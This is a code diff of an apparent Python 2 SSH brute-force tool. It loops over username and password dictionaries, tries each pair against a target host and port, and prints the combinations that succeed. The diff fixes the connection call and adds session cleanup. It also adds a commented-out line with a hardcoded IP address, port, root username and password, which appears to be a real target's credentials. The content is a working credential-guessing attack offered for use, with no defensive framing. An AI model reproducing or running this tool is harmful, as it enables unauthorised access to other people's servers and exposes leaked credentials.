@@ -31,11 +31,12 @@ def connectToHp(host,port):
         return False
 def connectToSSH(ssh,host,port,username,password):
     try:
-        ssh.connect(host,22,user,pwd,timeout=5)
+        print host+':'+str(port)+'\t'+username+password
+        ssh.connect(host,port=port,username=username,password=password,timeout=5)
         return True
     except:
         return False
-
+# ssh.connect('98.142.135.39',29890,'root','qsh6245451',timeout=5)
 
 def explode(host,port,dic):
     # port 这里是int类型
@@ -67,9 +68,11 @@ def explodeListHp(hp):
     for username in userDic:
         for password in passwdDic:
             if connectToSSH(ssh,host,port,username,password):
-                print '\33[33m'+hp+':ssh\t'+'username:'+username+'\tpassword:'+password+'\33[37m'
+                print '\33[33mssh://'+hp+'\t'+'username:'+username+'\tpassword:'+password+'\33[37m'
                 if LAZY_EXPOLDE:
+                    ssh.close()
                     return
+    ssh.close()
 
 if __name__ == '__main__':
     if len(sys.argv)!=2:
